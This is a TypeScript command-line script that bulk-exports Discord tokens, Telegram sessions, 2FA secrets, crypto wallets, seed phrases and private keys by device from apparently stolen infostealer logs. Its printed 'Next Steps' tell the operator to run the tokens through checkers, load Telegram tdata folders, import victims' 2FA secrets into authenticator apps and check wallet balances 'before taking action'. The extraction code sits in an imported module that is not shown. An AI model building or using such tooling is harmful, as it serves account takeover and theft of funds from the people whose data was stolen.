#!/usr/bin/env ts-node
/**
 * Export Discord tokens, Telegram sessions, 2FA data, and crypto wallets
 *
 * Usage:
 *   npm run export:messaging [output-dir] [device-id]
 *   npm run export:messaging ./messaging-exports
 *   npm run export:messaging ./messaging-exports abc123
 */

import { mkdir } from "fs/promises"
import { existsSync } from "fs"
import path from "path"
import {
  exportMessagingPackage,
  exportDiscordTokens,
  exportDiscordTokensRaw,
  exportTelegramSessions,
  export2FAData,
  exportCryptoWallets,
  exportSeedPhrases,
  exportPrivateKeys,
  exportMessagingStats,
} from "../lib/messaging-export"

async function main() {
  const args = process.argv.slice(2)

  // Parse arguments
  const outputDir = args[0] || "./messaging-exports"
  const deviceId = args[1] || undefined

  console.log("🔐 Messaging & Token Bulk Export Tool")
  console.log("=" .repeat(70))
  console.log(`📁 Output directory: ${outputDir}`)
  console.log(`🖥️  Device filter: ${deviceId || "ALL DEVICES"}`)
  console.log("")

  // Create output directory
  if (!existsSync(outputDir)) {
    await mkdir(outputDir, { recursive: true })
    console.log(`✅ Created directory: ${outputDir}`)
  }

  console.log("📤 Exporting messaging & token data...")
  console.log("")

  // Export complete package
  const result = await exportMessagingPackage(outputDir, deviceId)

  // Display results
  console.log("=" .repeat(70))
  console.log("📊 Export Results:")
  console.log("=" .repeat(70))

  for (const file of result.files) {
    const fileName = path.basename(file.file_path || "unknown")
    const status = file.success ? "✅" : "❌"
    const records = file.total_records || 0

    console.log(`${status} ${fileName}`)
    if (file.success) {
      console.log(`   Records: ${records.toLocaleString()}`)
      console.log(`   Path: ${file.file_path}`)
    } else {
      console.log(`   Error: ${file.error}`)
    }
    console.log("")
  }

  console.log("=" .repeat(70))
  console.log("📋 Export Summary:")
  console.log("=" .repeat(70))

  const fileResults = result.files.filter((f) => f.success)

  const discordTokens = fileResults.find((f) => f.file_path?.includes("discord-tokens.txt"))
  const telegramSessions = fileResults.find((f) =>
    f.file_path?.includes("telegram-sessions.txt"),
  )
  const auth2FA = fileResults.find((f) => f.file_path?.includes("2fa-data.txt"))
  const wallets = fileResults.find((f) => f.file_path?.includes("crypto-wallets.txt"))
  const seeds = fileResults.find((f) => f.file_path?.includes("seed-phrases.txt"))
  const keys = fileResults.find((f) => f.file_path?.includes("private-keys.txt"))

  console.log(`Discord Tokens: ${discordTokens?.total_records || 0}`)
  console.log(`Telegram Sessions: ${telegramSessions?.total_records || 0}`)
  console.log(`2FA Entries: ${auth2FA?.total_records || 0}`)
  console.log(`Crypto Wallets: ${wallets?.total_records || 0}`)
  console.log(`  - Seed Phrases: ${seeds?.total_records || 0}`)
  console.log(`  - Private Keys: ${keys?.total_records || 0}`)
  console.log("")

  console.log("=" .repeat(70))
  console.log("💡 Next Steps:")
  console.log("=" .repeat(70))
  console.log("1. Discord Tokens:")
  console.log(`   - Use discord-tokens-raw.txt for token checkers/validators`)
  console.log(`   - Use discord-tokens.txt for detailed information`)
  console.log("")
  console.log("2. Telegram Sessions:")
  console.log(`   - Copy tdata folders to Telegram Desktop directory`)
  console.log(`   - Sessions with HAS_KEY=YES are most valuable`)
  console.log("")
  console.log("3. 2FA Data:")
  console.log(`   - Import SECRET keys into authenticator apps`)
  console.log(`   - Use backup codes for account recovery`)
  console.log("")
  console.log("4. Crypto Wallets:")
  console.log(`   - NEVER share seed phrases or private keys`)
  console.log(`   - Import into wallet apps for recovery/analysis`)
  console.log(`   - Check balances before taking action`)
  console.log("")
  console.log("🚨 SECURITY WARNING:")
  console.log(
    "These files contain HIGHLY SENSITIVE data. Store securely and delete when no longer needed.",
  )
  console.log("")

  const successCount = result.files.filter((f) => f.success).length
  if (successCount === 0) {
    console.log("⚠️  No data exported. Make sure you have processed some logs first.")
    process.exit(1)
  } else {
    console.log(`✅ Successfully exported ${successCount}/${result.total_files} files!`)
  }
}

main().catch((err) => {
  console.error("❌ Error:", err)
  process.exit(1)
})
